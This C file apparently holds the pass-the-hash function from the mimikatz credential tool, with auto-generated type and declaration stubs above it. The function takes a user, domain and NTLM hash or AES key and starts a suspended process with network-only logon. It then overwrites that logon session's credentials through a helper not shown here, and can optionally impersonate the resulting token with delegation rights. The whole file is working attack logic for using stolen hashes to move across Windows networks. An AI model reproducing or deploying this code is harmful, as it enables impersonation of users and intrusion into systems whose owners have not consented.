
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_11__ TYPE_4__ ;
typedef struct TYPE_10__ TYPE_3__ ;
typedef struct TYPE_9__ TYPE_2__ ;
typedef struct TYPE_8__ TYPE_1__ ;


typedef int wchar_t ;
typedef int tokenStats ;
struct TYPE_11__ {int hProcess; int hThread; int dwThreadId; int dwProcessId; } ;
struct TYPE_10__ {scalar_t__ isReplaceOk; int * Aes256Key; int * Aes128Key; int * NtlmHash; int member_4; int * member_3; int * member_2; int * member_1; TYPE_1__* member_0; } ;
struct TYPE_8__ {int LowPart; scalar_t__ HighPart; } ;
struct TYPE_9__ {TYPE_1__ AuthenticationId; } ;
typedef TYPE_2__ TOKEN_STATISTICS ;
typedef TYPE_3__ SEKURLSA_PTH_DATA ;
typedef TYPE_4__ PROCESS_INFORMATION ;
typedef int * PCWCHAR ;
typedef int NTSTATUS ;
typedef int HANDLE ;
typedef int DWORD ;
typedef int BYTE ;
typedef scalar_t__ BOOL ;


 int AES_128_KEY_LENGTH ;
 int AES_256_KEY_LENGTH ;
 int CREATE_SUSPENDED ;
 int CloseHandle (int ) ;
 scalar_t__ DuplicateTokenEx (int ,int,int *,int ,int ,int *) ;
 int FALSE ;
 scalar_t__ GetTokenInformation (int ,int ,TYPE_2__*,int,int *) ;
 int KULL_M_PROCESS_CREATE_LOGON ;
 scalar_t__ KULL_M_WIN_MIN_BUILD_7 ;
 int LM_NTLM_HASH_LENGTH ;
 int LOGON_NETCREDENTIALS_ONLY ;
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ;
 int NtResumeProcess (int ) ;
 int NtTerminateProcess (int ,int ) ;
 scalar_t__ OpenProcessToken (int ,int,int *) ;
 int PRINT_ERROR (char*) ;
 int PRINT_ERROR_AUTO (char*) ;
 int STATUS_FATAL_APP_EXIT ;
 int STATUS_SUCCESS ;
 int SecurityDelegation ;
 scalar_t__ SetThreadToken (int *,int ) ;
 int TOKEN_DUPLICATE ;
 int TOKEN_IMPERSONATE ;
 int TOKEN_QUERY ;
 int TOKEN_READ ;
 int TokenImpersonation ;
 int TokenStatistics ;
 char* _wpgmptr ;
 int kprintf (char*,...) ;
 int kuhl_m_sekurlsa_pth_luid (TYPE_3__*) ;
 scalar_t__ kull_m_process_create (int ,int *,int ,int *,int ,int *,int *,char*,TYPE_4__*,int ) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int **,char*) ;
 scalar_t__ kull_m_string_stringToHex (int *,int *,int) ;
 int kull_m_string_wprintf_hex (int *,int,int ) ;
 int wcstoul (int *,int *,int ) ;

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
{
 BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
 TOKEN_STATISTICS tokenStats;
 SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, ((void*)0), ((void*)0), ((void*)0), FALSE};
 PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid = ((void*)0);
 DWORD dwNeededSize;
 HANDLE hToken, hNewToken;
 PROCESS_INFORMATION processInfos;
 BOOL isImpersonate;

 if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, ((void*)0)))
 {
  tokenStats.AuthenticationId.HighPart = 0;
  tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, ((void*)0), 0);
 }
 else
 {
  if(kull_m_string_args_byName(argc, argv, L"user", &szUser, ((void*)0)))
  {
   if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, ((void*)0)))
   {
    isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", ((void*)0), ((void*)0));
#pragma warning(push)
#pragma warning(disable:4996)
 kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
#pragma warning(pop)
 kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");

   }
   else PRINT_ERROR(L"Missing argument : domain\n");
  }
  else PRINT_ERROR(L"Missing argument : user\n");
 }

 if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, ((void*)0)))
 {
  if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
  {
   if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
   {
    data.Aes128Key = aes128key;
    kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
   }
   else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
  }
  else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 }

 if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, ((void*)0)))
 {
  if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
  {
   if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
   {
    data.Aes256Key = aes256key;
    kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
   }
   else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
  }
  else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 }

 if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, ((void*)0)) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, ((void*)0)))
 {
  if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
  {
   data.NtlmHash = ntlm;
   kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
  }
  else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
 }

 if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
 {
  if(szLuid)
  {
   kprintf(L"mode\t: replacing NTLM/RC4 key in a session\n");
   kuhl_m_sekurlsa_pth_luid(&data);
  }
  else if(szUser)
  {
   if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, ((void*)0), LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
   {
    kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
    if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
    {
     if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
     {
      kuhl_m_sekurlsa_pth_luid(&data);
      if(data.isReplaceOk)
      {
       if(isImpersonate)
       {
        if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ((void*)0), SecurityDelegation, TokenImpersonation, &hNewToken))
        {
         if(SetThreadToken(((void*)0), hNewToken))
          kprintf(L"** Token Impersonation **\n");
         else PRINT_ERROR_AUTO(L"SetThreadToken");
         CloseHandle(hNewToken);
        }
        else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
        NtTerminateProcess(processInfos.hProcess, STATUS_SUCCESS);
       }
       else NtResumeProcess(processInfos.hProcess);
      }
      else NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
     }
     else PRINT_ERROR_AUTO(L"GetTokenInformation");
     CloseHandle(hToken);
    }
    else PRINT_ERROR_AUTO(L"OpenProcessToken");
    CloseHandle(processInfos.hThread);
    CloseHandle(processInfos.hProcess);
   }
   else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
  }
  else PRINT_ERROR(L"Bas user or LUID\n");
 }
 else PRINT_ERROR(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");

 return STATUS_SUCCESS;
}
